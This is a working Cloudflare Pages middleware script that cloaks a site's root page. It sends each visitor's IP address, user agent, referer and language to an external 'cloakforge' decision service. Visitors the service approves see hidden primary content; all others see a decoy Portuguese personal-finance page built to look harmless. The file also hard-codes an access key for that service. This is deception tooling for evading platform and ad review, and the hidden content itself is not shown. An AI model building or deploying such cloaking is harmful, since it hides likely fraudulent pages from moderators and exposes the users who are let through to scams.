// ============================================================
// Server-Side Request Router — Cloudflare Pages Middleware
// Conditional decision routing for root route ("/")
// ============================================================

/**
 * Top-level Configuration Constants
 * - PRIMARY_URL: If defined, redirects (302) to this destination on 'allow'.
 *                If empty (''), serves this route's primary content (Variant A).
 */
const PRIMARY_URL = '';

const CLOAK_SLUG = 'bright-feed';
const CLOAK_KEY = 'lEEv-oRaRLazQL_OLdtoIgOj90h5Pqme';
const CLOAK_ENDPOINT = 'http://cloakforge.app.br/api/cloak/decide';

/**
 * Variant B: Self-contained, plausible institutional / editorial page.
 * Loads inline on the root route with zero references to Variant A.
 */
const VARIANT_B_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Portal Finanças & Cidadania — Informação e Planejamento Familiar</title>
  <meta name="description" content="Artigos informativos, guias de planejamento orçamentário e orientações sobre direitos básicos do consumidor.">
  <style>
    :root {
      --bg: #f8fafc;
      --surface: #ffffff;
      --primary: #0f172a;
      --accent: #2563eb;
      --text: #334155;
      --muted: #64748b;
      --border: #e2e8f0;
      --radius: 12px;
      --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -2px rgba(0, 0, 0, 0.05);
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      line-height: 1.65;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    header {
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      position: sticky;
      top: 0;
      z-index: 10;
    }
    .header-container {
      max-width: 1080px;
      margin: 0 auto;
      padding: 16px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      text-decoration: none;
      color: var(--primary);
      font-weight: 700;
      font-size: 1.15rem;
      letter-spacing: -0.02em;
    }
    .brand-icon {
      width: 32px;
      height: 32px;
      background: var(--accent);
      color: #fff;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 800;
      font-size: 0.95rem;
    }
    nav ul {
      display: flex;
      list-style: none;
      gap: 20px;
    }
    nav a {
      color: var(--muted);
      text-decoration: none;
      font-size: 0.9rem;
      font-weight: 500;
      transition: color 0.15s;
    }
    nav a:hover { color: var(--accent); }
    main {
      flex: 1;
      max-width: 1080px;
      width: 100%;
      margin: 32px auto;
      padding: 0 20px;
      display: grid;
      grid-template-columns: 2fr 1fr;
      gap: 36px;
    }
    @media (max-width: 820px) {
      main { grid-template-columns: 1fr; gap: 24px; margin: 20px auto; }
      nav { display: none; }
    }
    article {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 36px;
      box-shadow: var(--shadow);
    }
    @media (max-width: 540px) {
      article { padding: 22px; }
    }
    .article-tag {
      display: inline-block;
      background: #eff6ff;
      color: var(--accent);
      font-size: 0.75rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      padding: 4px 10px;
      border-radius: 999px;
      margin-bottom: 14px;
    }
    h1 {
      color: var(--primary);
      font-size: 1.85rem;
      line-height: 1.3;
      margin-bottom: 12px;
      letter-spacing: -0.02em;
    }
    .meta {
      display: flex;
      gap: 16px;
      color: var(--muted);
      font-size: 0.85rem;
      margin-bottom: 24px;
      padding-bottom: 18px;
      border-bottom: 1px solid var(--border);
    }
    p { margin-bottom: 18px; }
    h2 {
      color: var(--primary);
      font-size: 1.35rem;
      margin: 28px 0 12px;
      letter-spacing: -0.01em;
    }
    .highlight-card {
      background: #f1f5f9;
      border-left: 4px solid var(--accent);
      border-radius: 0 var(--radius) var(--radius) 0;
      padding: 16px 20px;
      margin: 24px 0;
      font-size: 0.95rem;
    }
    ul.tips-list {
      margin: 16px 0 24px 20px;
    }
    ul.tips-list li {
      margin-bottom: 10px;
    }
    aside {
      display: flex;
      flex-direction: column;
      gap: 24px;
    }
    .sidebar-card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 24px;
      box-shadow: var(--shadow);
    }
    .sidebar-title {
      font-size: 1.05rem;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 14px;
      border-bottom: 1px solid var(--border);
      padding-bottom: 8px;
    }
    .side-links {
      list-style: none;
      display: flex;
      flex-direction: column;
      gap: 12px;
      font-size: 0.9rem;
    }
    .side-links a {
      color: var(--text);
      text-decoration: none;
      transition: color 0.15s;
    }
    .side-links a:hover { color: var(--accent); }
    footer {
      background: var(--primary);
      color: #94a3b8;
      font-size: 0.85rem;
      padding: 32px 20px;
      margin-top: auto;
    }
    .footer-container {
      max-width: 1080px;
      margin: 0 auto;
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      gap: 20px;
      align-items: center;
    }
  </style>
</head>
<body>
  <header>
    <div class="header-container">
      <a href="/" class="brand">
        <span class="brand-icon">FC</span>
        <span>Finanças & Cidadania</span>
      </a>
      <nav>
        <ul>
          <li><a href="/">Início</a></li>
          <li><a href="/">Educação Financeira</a></li>
          <li><a href="/">Direitos do Consumidor</a></li>
          <li><a href="/">Contato</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <main>
    <article>
      <span class="article-tag">Planejamento & Economia</span>
      <h1>Guia Prático: Como Organizar o Orçamento Familiar e Criar Estabilidade Financeira</h1>
      <div class="meta">
        <span>Atualizado em Outubro de 2026</span>
        <span>•</span>
        <span>Tempo de leitura: 4 min</span>
        <span>•</span>
        <span>Redação Editorial</span>
      </div>

      <p>Manter a saúde financeira em equilíbrio exige método, disciplina e compreensão clara dos fluxos de entrada e saída de recursos. Em períodos de oscilação econômica, a estruturação de um orçamento preventivo torna-se a principal ferramenta para proteger o patrimônio e garantir tranquilidade familiar.</p>

      <h2>O Método dos Três Blocos Orçamentários</h2>
      <p>Uma das abordagens mais consolidadas por consultores e educadores econômicos é a distribuição proporcional da renda líquida familiar em três categorias prioritárias:</p>

      <ul class="tips-list">
        <li><strong>Gastos Essenciais (50% a 60%):</strong> Moradia, alimentação básica, saúde, transporte indispensável e contas de serviços fundamentais.</li>
        <li><strong>Estilo de Vida e Conforto (20% a 30%):</strong> Lazer, refeições fora de casa, assinaturas e despesas de conveniência.</li>
        <li><strong>Reserva Estratégica (15% a 20%):</strong> Formação de reserva de liquidez imediata para imprevistos e metas de médio prazo.</li>
      </ul>

      <div class="highlight-card">
        <strong>Recomendação Prática:</strong> A reserva de emergência deve cobrir entre 3 a 6 meses do custo de vida básico familiar e precisa estar alocada em aplicações de alta liquidez e baixo risco.
      </div>

      <h2>Prevenção e Conscientização no Uso do Crédito</h2>
      <p>O crédito ao consumidor pode ser um instrumento de desenvolvimento quando utilizado com planejamento, mas demanda atenção redobrada aos custos efetivos totais (CET). Recomenda-se avaliar taxas contratuais, juros rotativos e evitar comprometer mais de 30% da renda mensal com parcelamentos cumulativos.</p>

      <h2>Direitos Básicos do Consumidor</h2>
      <p>O Código de Defesa do Consumidor assegura o direito à informação clara, transparência nas faturas e acesso facilitado aos canais de atendimento das instituições financeiras e de prestação de serviços. Em caso de dúvidas sobre cobranças, procure sempre formalizar solicitações através dos canais de protocolo e ouvidorias competentes.</p>
    </article>

    <aside>
      <div class="sidebar-card">
        <div class="sidebar-title">Tópicos Relacionados</div>
        <ul class="side-links">
          <li><a href="/">• Como calcular o Custo Efetivo Total (CET)</a></li>
          <li><a href="/">• Guia para redução de despesas fixas mensais</a></li>
          <li><a href="/">• Planejamento previdenciário e poupança de longo prazo</a></li>
          <li><a href="/">• Conscientização contra fraudes eletrônicas comuns</a></li>
        </ul>
      </div>

      <div class="sidebar-card">
        <div class="sidebar-title">Sobre o Portal</div>
        <p style="font-size: 0.88rem; color: var(--muted); margin-bottom: 0;">
          Espaço informativo e educativo dedicado à disseminação de boas práticas de gestão financeira pessoal e direitos do consumidor.
        </p>
      </div>
    </aside>
  </main>

  <footer>
    <div class="footer-container">
      <div>© 2026 Finanças & Cidadania — Informação para o seu dia a dia.</div>
      <div>Conteúdo educativo e institucional. Todos os direitos reservados.</div>
    </div>
  </footer>
</body>
</html>`;

/**
 * Resolves the real client IP following the mandated precedence order:
 * cf-connecting-ip -> true-client-ip -> x-vercel-forwarded-for -> x-real-ip ->
 * x-forwarded-for (first token) -> fly-client-ip -> socket/remote address.
 */
function resolveClientIp(headers) {
  // 1. cf-connecting-ip
  const cfIp = headers.get('cf-connecting-ip');
  if (cfIp && cfIp.trim()) return cfIp.trim();

  // 2. true-client-ip
  const trueClientIp = headers.get('true-client-ip');
  if (trueClientIp && trueClientIp.trim()) return trueClientIp.trim();

  // 3. x-vercel-forwarded-for
  const vercelIp = headers.get('x-vercel-forwarded-for');
  if (vercelIp && vercelIp.trim()) return vercelIp.trim();

  // 4. x-real-ip
  const realIp = headers.get('x-real-ip');
  if (realIp && realIp.trim()) return realIp.trim();

  // 5. x-forwarded-for (first token)
  const xff = headers.get('x-forwarded-for');
  if (xff && xff.trim()) {
    const firstToken = xff.split(',')[0].trim();
    if (firstToken) return firstToken;
  }

  // 6. fly-client-ip
  const flyIp = headers.get('fly-client-ip');
  if (flyIp && flyIp.trim()) return flyIp.trim();

  return '';
}

/**
 * Main Cloudflare Pages Middleware Handler
 */
export async function onRequest(context) {
  const { request, next } = context;
  const url = new URL(request.url);

  // Router operates strictly on the root route ("/" or "/index.html")
  const isRootRoute = url.pathname === '/' || url.pathname === '/index.html';
  if (!isRootRoute) {
    return next();
  }

  const clientIp = resolveClientIp(request.headers);
  const userAgent = request.headers.get('user-agent') || '';
  const referer = request.headers.get('referer') || '';
  const acceptLang = request.headers.get('accept-language') || '';

  let decisionAction = 'block';

  try {
    const query = new URLSearchParams({
      slug: CLOAK_SLUG,
      key: CLOAK_KEY,
      ip: clientIp,
      ua: userAgent,
      url: request.url,
      ref: referer,
      lang: acceptLang,
    });

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3500);

    const decideRes = await fetch(`${CLOAK_ENDPOINT}?${query.toString()}`, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
      },
      signal: controller.signal,
    });
    clearTimeout(timeoutId);

    if (decideRes.ok) {
      const data = await decideRes.json().catch(() => null);
      if (data && typeof data.action === 'string') {
        decisionAction = data.action.toLowerCase().trim();
      }
    }
  } catch (_) {
    // Invariant: any state other than "allow" falls back to Variant B
    decisionAction = 'block';
  }

  // Routing decision
  if (decisionAction === 'allow') {
    if (PRIMARY_URL && PRIMARY_URL.trim()) {
      return Response.redirect(PRIMARY_URL.trim(), 302);
    }
    // Emit Variant A (this route's primary content)
    return next();
  }

  // Emit Variant B INLINE on the root route (no redirect, zero external dependency)
  return new Response(VARIANT_B_HTML, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
      'Pragma': 'no-cache',
    },
  });
}
